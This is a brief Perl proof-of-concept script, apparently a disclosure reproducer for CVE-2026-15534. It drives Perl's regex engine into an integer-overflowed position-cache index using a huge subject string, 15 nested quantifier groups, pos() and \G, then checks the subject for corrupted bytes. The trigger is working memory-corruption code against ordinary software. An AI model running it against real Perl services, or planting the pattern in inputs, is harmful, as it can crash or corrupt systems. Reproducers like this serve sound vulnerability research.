#!/usr/bin/perl
# CVE-2026-15534 local reproducer. No network, no service.
# Subject length 286331153 and 15 WHILEM nodes: (286331153+1)*15 = 2^32+14.
# \G plus pos() places the working match near the end of the full-length
# subject, so (locinput - strbeg)*15 becomes a huge poscache index. The tail
# holds 16 'a's: above the pattern minlen so the engine actually runs, small
# enough to bound backtracking while the undersized cache is active.
use strict;
use warnings;

my $len = 286331153;
my $tail = 16;
my $subject = ('x' x ($len - $tail)) . ('a' x $tail);
my $groups = '((a+)+)' x 15;
my $pattern = qr/\G${groups}b/;  # trailing b cannot match: forces WHILEM failures
my $offset = $len - $tail;

print "subject=", length($subject), " pos=$offset\n";
pos($subject) = $offset;
my $ok = ($subject =~ /$pattern/g);
print $ok ? "MATCH\n" : "NOMATCH\n";
if ($subject =~ /([^ax])/) {
    printf "SUBJECT_CHANGE offset=%d byte=0x%02x\n", $-[0], ord($1);
}
else {
    print "SUBJECT_CHANGES=0\n";
}
print "DONE\n";
